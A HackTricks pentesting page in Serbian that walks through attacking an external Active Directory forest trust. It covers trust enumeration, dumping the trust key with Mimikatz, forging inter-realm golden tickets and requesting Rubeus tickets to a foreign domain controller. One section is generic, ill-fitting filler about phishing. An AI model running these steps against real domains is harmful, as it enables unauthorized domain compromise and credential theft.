# External Forest Domain - OneWay (Inbound) or bidirectional

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

U ovom scenariju spoljni domen vam veruje (ili se međusobno veruju), tako da možete dobiti neku vrstu pristupa nad njim.

## Enumeracija

Prvo od svega, morate **enumerisati** **poverenje**:

```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```

U prethodnom nabrajanju je utvrđeno da je korisnik **`crossuser`** unutar grupe **`External Admins`** koji ima **Admin pristup** unutar **DC-a spoljnog domena**.

## Početni pristup

Ako **niste** pronašli nikakav **poseban** pristup vašeg korisnika u drugom domenu, i dalje možete se vratiti na AD metodologiju i pokušati **privesc sa neprivilegovanog korisnika** (kao što je na primer kerberoasting):

Možete koristiti **Powerview funkcije** za **nabrajanje** drugog domena koristeći `-Domain` parametar kao u primeru:

```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Impersonacija

### Prijavljivanje

Korišćenjem redovne metode sa pristupnim podacima korisnika koji ima pristup spoljnom domenu, trebali biste moći da pristupite:

```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```

### Zloupotreba SID istorije

Takođe možete zloupotrebiti [**SID istoriju**](sid-history-injection.md) preko poverenja između šuma.

Ako se korisnik migrira **iz jednog šuma u drugi** i **SID filtriranje nije omogućeno**, postaje moguće **dodati SID iz drugog šuma**, i ovaj **SID** će biti **dodat** u **korisnikov token** prilikom autentifikacije **preko poverenja**.

{% hint style="warning" %}
Kao podsetnik, možete dobiti ključ za potpisivanje sa

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Možete **potpisati** **pouzdanim** ključem **TGT impersonating** korisnika trenutne domene.

```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

### Potpuno preuzimanje identiteta korisnika

U ovom scenariju, napadač ima potpunu kontrolu nad korisnikovim nalogom i može se predstavljati kao taj korisnik. Ovo omogućava napadaču da pristupi svim resursima i privilegijama koje korisnik ima.

Da biste izvršili ovu tehniku, pratite sledeće korake:

1. Napadač preuzima korisnikovu lozinku ili koristi tehnike kao što su "phishing" ili "password spraying" da bi je otkrio.
2. Napadač se prijavljuje na sistem koristeći korisnikove legitimne kredencijale.
3. Nakon prijave, napadač ima potpunu kontrolu nad korisnikovim nalogom i može izvršavati sve radnje koje korisnik može.
4. Napadač može pristupiti svim resursima koji su dostupni korisniku, uključujući fajlove, mrežne resurse i privilegije.
5. Napadač može izvršavati bilo koje akcije u ime korisnika, uključujući slanje e-pošte, pristupanje aplikacijama i manipulaciju podacima.

Važno je napomenuti da je ova tehnika ilegalna i da se koristi samo u okviru etičkog hakovanja ili testiranja bezbednosti sistema uz dozvolu vlasnika sistema.

```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
